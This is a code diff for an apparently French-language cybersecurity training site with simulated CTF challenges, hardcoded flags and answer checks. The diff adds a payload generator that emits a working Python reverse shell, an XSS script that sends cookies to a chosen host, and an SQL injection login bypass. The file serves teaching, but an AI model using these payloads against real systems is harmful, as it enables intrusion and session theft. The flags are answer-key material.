-    if(currentCTF.simType === "html") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">💻 Faux Navigateur Web</div><div style="background:#fff; color:#000; padding:20px; text-align:center;"><h1>Admin</h1></div><button onclick="document.getElementById('source-code').style.display='block'" class="btn-back" style="margin-top:10px;">[Clic-droit] > Code source</button><div id="source-code" style="display:none; margin-top:15px; color:#4ade80; font-family:monospace;">&lt;html&gt;<br>&nbsp;&nbsp;&lt;!-- FLAG{html_source_ez} --&gt;<br>&lt;/html&gt;</div></div>`; }
-    else if(currentCTF.simType === "crypto") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">Intercepté</div><div style="word-break:break-all; color:var(--warning); font-family:monospace;">RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb259</div></div>`; }
-    else if(currentCTF.simType === "sqli") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">⚙️ [ TARGET ] : ${currentCTF.desc}</div><input type="text" id="ctf-sql-input" class="web-input" placeholder="Mot de passe..."><button class="auth-btn" style="background:var(--danger);" onclick="checkCTFSQL()">Login</button><div id="ctf-sql-output" class="term-output"></div></div>`; }
-    else if(currentCTF.simType === "ctf_logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">Log Server (14:00 - 14:05)</div><div class="log-viewer">14:01 - 10.0.0.1 - GET /index.html<br>14:02 - 172.16.0.4 - GET /login.php?admin=1</div><input type="text" id="ctf-log-input" class="web-input" placeholder="IP Attaquant..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkCTFLog()">Valider</button><div id="ctf-log-out" class="term-output"></div></div>`; }
-    else if(currentCTF.simType === "osint") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">Terminal OSINT</div><p style="color:var(--text-muted); font-size:0.9rem;">Utilisez le HUD. Tapez 'whoami', puis 'search'.</p></div>`; }
+    if(currentCTF.simType === "html") { simC.innerHTML = `<div class="sim-box"><div class="sim-header">💻 Faux Navigateur Web</div><div style="background:#fff; color:#000; padding:20px; text-align:center;"><h1>Admin</h1></div><button onclick="document.getElementById('source-code').style.display='block'" class="btn-back" style="margin-top:10px;">Code source</button><div id="source-code" style="display:none; margin-top:15px; color:#4ade80; font-family:monospace;">&lt;html&gt;<br>&nbsp;&nbsp;&lt;!-- FLAG{html_source_ez} --&gt;<br>&lt;/html&gt;</div></div>`; }
+    else if(currentCTF.simType === "idor_ctf") { simC.innerHTML = `<div class="sim-box sim-red"><div class="sim-header">Cible IDOR CTF</div><input type="text" id="ctf-idor-id" class="web-input" value="5" placeholder="ID..."><button class="auth-btn" style="background:var(--danger);" onclick="checkCTFIDOR()">Inspecter</button><div id="ctf-idor-out" class="term-output"></div></div>`; }
+    else if(currentCTF.simType === "ctf_logs") { simC.innerHTML = `<div class="sim-box sim-blue"><div class="sim-header">Logs</div><div class="log-viewer">172.16.0.4 - SQLi attempt</div><input type="text" id="ctf-log-input" class="web-input" placeholder="IP..."><button class="auth-btn" style="background:#3b82f6;" onclick="checkCTFLog()">Valider</button><div id="ctf-log-out" class="term-output"></div></div>`; }
     else { simC.innerHTML = ''; }
     
     document.getElementById('flag-input').value = '';
@@ -396,8 +379,13 @@ function openCTF(ctfId) {
     switchView('challenge-view');
 }
 
-function checkCTFSQL() { const val = document.getElementById('ctf-sql-input').value; if (val.includes("' OR 1=1")) { document.getElementById('ctf-sql-output').innerHTML = "<span style='color:var(--accent);'>[BYPASS RÉUSSI] FLAG{red_team_sql}</span>"; } else { document.getElementById('ctf-sql-output').innerHTML = "Accès refusé."; } }
-function checkCTFLog() { const val = document.getElementById('ctf-log-input').value.trim(); if(val === "172.16.0.4") { document.getElementById('ctf-log-out').innerHTML = "<span style='color:var(--accent);'>Correct. FLAG{blue_log_master}</span>"; } else { document.getElementById('ctf-log-out').innerHTML = "Incorrect."; } }
+function checkCTFIDOR() {
+    const val = document.getElementById('ctf-idor-id').value.trim();
+    const out = document.getElementById('ctf-idor-out');
+    if(val === "1") { out.innerHTML = "<span style='color:var(--accent);'>Données admin : FLAG{idor_admin_leak}</span>"; }
+    else { out.innerHTML = "Utilisateur standard."; }
+}
+function checkCTFLog() { const val = document.getElementById('ctf-log-input').value.trim(); if(val === "172.16.0.4") { document.getElementById('ctf-log-out').innerHTML = "<span style='color:var(--accent);'>FLAG{blue_log_master}</span>"; } }
 
 function submitFlag() {
     const ctfId = document.getElementById('challenge-view').dataset.ctfId;
@@ -413,36 +401,18 @@ function submitFlag() {
         setTimeout(() => switchView('ctf-view'), 2000);
     } else {
         resBox.style.background = 'rgba(239, 68, 68, 0.2)'; resBox.style.color = 'var(--danger)'; resBox.style.border = '1px solid var(--danger)';
-        resBox.innerText = "[-] Flag Incorrect. Try harder.";
+        resBox.innerText = "[-] Flag Incorrect.";
     }
 }
 
-// =========================================================================
-// 7. TERMINAL HUD & NOUVEL OUTIL CIDR
-// =========================================================================
-
-function toggleHUD() { document.getElementById('hud-terminal').classList.toggle('open'); }
-
-function handleHUD(e) {
-    if (e.key === 'Enter') {
-        const inputEl = document.getElementById('hud-input');
-        const outEl = document.getElementById('hud-output');
-        const val = escapeHTML(inputEl.value.trim().toLowerCase());
-        
-        outEl.innerHTML += `<br><span style="color:var(--accent);">> ${val}</span>`;
-        let response = "";
-        
-        if (val === "help") response = "\n--- SYS COMMANDS ---\n1. help\n2. whoami\n3. pwd\n4. ls -a\n5. search : Indice (1/jour)";
-        else if (val === "whoami") response = `User: ${activeUser || "Anonymous"}`;
-        else if (val === "pwd") response = "/var/www/cyberacademy";
-        else if (val === "ls -a") response = ".bash_history  .secret_flag";
-        else if (val === "search") response = "💡 Indice (CTF OSINT) : Le flag complet est FLAG{osint_ghost_tracker}";
-        else if (val !== "") response = `bash: ${val}: command not found`;
-        
-        outEl.innerHTML += `<br><span style="color:var(--text-main);">${response}</span>`;
-        outEl.scrollTop = outEl.scrollHeight;
-        inputEl.value = '';
-    }
+// Toolkit et Payload Generator
+function generatePayload() {
+    const type = document.getElementById('payload-type').value;
+    const ip = escapeHTML(document.getElementById('payload-ip').value.trim());
+    const out = document.getElementById('payload-out');
+    if(type === 'py_rev') { out.innerHTML = `python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${ip}",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`; }
+    else if(type === 'xss_cookie') { out.innerHTML = `&lt;script&gt;fetch('http://${ip}/log?cookie=' + btoa(document.cookie));&lt;/script&gt;`; }
+    else if(type === 'sql_bypass') { out.innerHTML = `admin' OR 1=1 -- -`; }
 }
 
 async function generateHash() {
@@ -462,37 +432,18 @@ function handleBase64(action) {
     catch(e) { out.innerText = "Error: Invalid payload."; }
 }
 
-// NOUVEL OUTIL RÉEL : CALCULATEUR CIDR
-function calculateCIDR() {
-    const input = document.getElementById('tool-ip-in').value.trim();
-    const out = document.getElementById('tool-ip-out');
-    
-    if (!input.includes('/')) {
-        out.innerHTML = "<span style='color:var(--danger);'>Erreur : Format attendu (ex: 192.168.1.0/24)</span>";
-        return;
+function toggleHUD() { document.getElementById('hud-terminal').classList.toggle('open'); }
+function handleHUD(e) {
+    if (e.key === 'Enter') {
+        const inputEl = document.getElementById('hud-input');
+        const outEl = document.getElementById('hud-output');
+        const val = escapeHTML(inputEl.value.trim().toLowerCase());
+        outEl.innerHTML += `<br><span style="color:var(--accent);">> ${val}</span>`;
+        let response = val === "whoami" ? `User: ${activeUser || "Anonymous"}` : (val === "help" ? "Commandes : whoami, search" : "OK");
+        outEl.innerHTML += `<br><span style="color:var(--text-main);">${response}</span>`;
+        outEl.scrollTop = outEl.scrollHeight;
+        inputEl.value = '';
     }
-    
-    const parts = input.split('/');
-    const ip = parts[0];
-    const mask = parseInt(parts[1]);
-    
-    if (mask < 0 || mask > 32) {
-        out.innerHTML = "<span style='color:var(--danger);'>Erreur : Le masque doit être entre /0 et /32</span>";
-        return;
-    }
-    
-    const hosts = Math.pow(2, 32 - mask);
-    const usableHosts = mask >= 31 ? 0 : hosts - 2;
-    
-    out.innerHTML = `
-        <span style="color:var(--accent);">[+] Analyse de la notation CIDR terminée :</span><br>
-        Réseau analysé : ${ip}<br>
-        Masque (Bits) : /${mask}<br>
-        Total adresses (Hosts) : ${hosts}<br>
-        <span style="color:var(--warning);">Hôtes utilisables : ${usableHosts}</span><br>
-        <br><span style="color:var(--text-muted); font-size:0.8rem;">* En Pentest, scanner un /24 (254 hôtes) est rapide. Un /16 (65 534 hôtes) demande de l'automatisation.</span>
-    `;
 }
 
-// Lancement
 window.onload = initApp;
